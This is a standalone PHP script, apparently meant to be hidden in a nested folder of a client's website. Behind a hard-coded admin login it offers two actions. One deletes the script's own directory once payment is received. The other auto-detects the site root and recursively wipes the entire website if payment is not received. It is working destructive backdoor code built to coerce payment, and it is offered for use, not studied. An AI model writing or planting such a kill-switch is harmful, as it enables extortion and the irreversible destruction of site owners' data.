<?php
// payment_verification.php - Hidden in a nested folder

// Configuration - CHANGE THESE VALUES
$username = "admin";         // Change this to your secure username
$password = "securePass123"; // Change this to a strong password

// Auto-detect website root (goes up directories until it finds common web files)
function findWebsiteRoot() {
    $current_dir = __DIR__;
    $max_levels = 10; // Prevent infinite loops
    
    for ($i = 0; $i < $max_levels; $i++) {
        // Check for common web root indicators
        if (file_exists($current_dir . '/index.php') || 
            file_exists($current_dir . '/index.html') || 
            file_exists($current_dir . '/public_html') ||
            file_exists($current_dir . '/htdocs') ||
            file_exists($current_dir . '/www') ||
            file_exists($current_dir . '/.htaccess') ||
            file_exists($current_dir . '/wp-config.php')) {
            return $current_dir;
        }
        
        $parent_dir = dirname($current_dir);
        if ($parent_dir === $current_dir) {
            break; // Reached root directory
        }
        $current_dir = $parent_dir;
    }
    
    // If no web root found, assume current directory's parent
    return dirname(__DIR__);
}

$website_root = findWebsiteRoot();
$script_directory = __DIR__;

session_start();

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    if ($_POST['username'] === $username && $_POST['password'] === $password) {
        $_SESSION['authenticated'] = true;
    } else {
        $error = "Invalid credentials";
    }
}

// Handle actions (only if authenticated)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SESSION['authenticated'])) {
    if (isset($_POST['payment_received'])) {
        // Delete the entire script directory and its contents, then the directory itself
        $parent_dir = dirname($script_directory);
        deleteDirectory($script_directory);
        
        // If script directory was successfully deleted, also remove parent if it becomes empty
        if (!file_exists($script_directory)) {
            // Check if parent directory is empty (only contains . and ..)
            $parent_contents = scandir($parent_dir);
            $non_system_files = array_diff($parent_contents, array('.', '..'));
            
            if (empty($non_system_files)) {
                rmdir($parent_dir);
                die("Payment received. Script directory, parent directory, and all contents deleted.");
            } else {
                die("Payment received. Script directory and all contents deleted. Parent directory contains other files.");
            }
        } else {
            die("Payment received. Attempted to delete script directory.");
        }
    } 
    elseif (isset($_POST['no_payment'])) {
        // Wipe the entire website from root
        deleteDirectory($website_root);
        die("No payment received. Entire website wiped from root directory.");
    }
}

// Enhanced recursive directory deletion function
function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    
    foreach ($iterator as $file) {
        if ($file->isDir()) {
            rmdir($file->getRealPath());
        } else {
            unlink($file->getRealPath());
        }
    }
    
    return rmdir($dir);
}

// Display login form if not authenticated
if (!isset($_SESSION['authenticated'])): ?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .login-box { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { margin-top: 0; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
        button { background: #4CAF50; color: white; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #45a049; }
        .error { color: red; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Admin Login</h2>
        <?php if (isset($error)) echo "<p class='error'>$error</p>"; ?>
        <form method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" name="login">Login</button>
        </form>
    </div>
</body>
</html>
<?php exit(); endif; ?>

<!DOCTYPE html>
<html>
<head>
    <title>Payment Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .action-box { max-width: 600px; margin: 50px auto; background: white; padding: 30px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
        h2 { margin-top: 0; color: #333; }
        .btn { display: inline-block; padding: 12px 24px; margin: 10px; color: white; text-decoration: none; border-radius: 4px; cursor: pointer; border: none; font-size: 16px; }
        .btn-green { background: #4CAF50; }
        .btn-green:hover { background: #45a049; }
        .btn-red { background: #f44336; }
        .btn-red:hover { background: #d32f2f; }
        .btn-blue { background: #2196F3; }
        .btn-blue:hover { background: #1976D2; }
        .warning { color: #f44336; font-weight: bold; margin: 20px 0; }
        .info { color: #666; margin: 15px 0; font-size: 14px; }
        .logout-link { position: absolute; top: 20px; right: 20px; }
    </style>
</head>
<body>
    <div class="logout-link">
        <a href="?logout=1" class="btn btn-blue">Logout</a>
    </div>
    
    <div class="action-box">
        <h2>Payment Verification</h2>
        <p>Select the appropriate action based on client payment status:</p>
        
        <div class="info">
            <strong>Current Script Directory:</strong> <?php echo htmlspecialchars($script_directory); ?><br>
            <strong>Parent Directory:</strong> <?php echo htmlspecialchars(dirname($script_directory)); ?><br>
            <strong>Detected Website Root:</strong> <?php echo htmlspecialchars($website_root); ?>
        </div>
        
        <form method="post">
            <button type="submit" name="payment_received" class="btn btn-green" 
                    onclick="return confirm('Payment received? This will DELETE the entire parent directory: <?php echo addslashes(dirname($script_directory)); ?> and all its contents. Continue?');">
                Payment Received (Delete Parent Directory)
            </button>
        </form>
        
        <div class="warning">
            ⚠️ EXTREME WARNING ⚠️<br>
            The button below will DELETE THE ENTIRE WEBSITE from root directory<br>
            This will wipe out EVERYTHING including all folders, files, and nested content!
        </div>
        
        <form method="post" onsubmit="return confirm('🚨 FINAL WARNING 🚨\n\nThis will COMPLETELY WIPE OUT the entire website from: <?php echo addslashes($website_root); ?>\n\nALL FILES AND FOLDERS WILL BE PERMANENTLY DELETED!\n\nType YES in the next prompt to continue.') && prompt('Type YES to confirm complete website destruction:') === 'YES';">
            <button type="submit" name="no_payment" class="btn btn-red">
                No Payment Received (WIPE ENTIRE WEBSITE)
            </button>
        </form>
        
        <div class="info">
            <strong>Note:</strong> The script automatically detects the website root by looking for common web files (index.php, .htaccess, etc.) in parent directories.
        </div>
    </div>
</body>
</html>